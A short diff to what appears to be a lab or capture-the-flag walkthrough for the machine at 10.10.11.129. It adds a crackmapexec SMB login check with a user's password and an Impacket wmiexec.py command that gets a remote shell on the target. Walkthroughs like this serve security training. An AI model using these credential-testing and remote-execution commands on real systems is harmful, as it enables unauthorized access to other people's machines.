@@ -141,3 +141,15 @@ shortest to admin
 
 ![image](https://user-images.githubusercontent.com/33616880/230703076-28fdc717-d1b7-4ea9-94bd-1c35d378850e.png)
 ![image](https://user-images.githubusercontent.com/33616880/230703110-45490071-b360-4172-91bf-735b46483878.png)
+
+
+```
+crackmapexec smb 10.10.11.129 -u tristan.davies -p '0xdf0xdf!!!'
+```
+![image](https://user-images.githubusercontent.com/33616880/230703231-2e3c66d2-d334-42e4-942b-451e11657cc7.png)
+
+
+
+```
+./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
+```
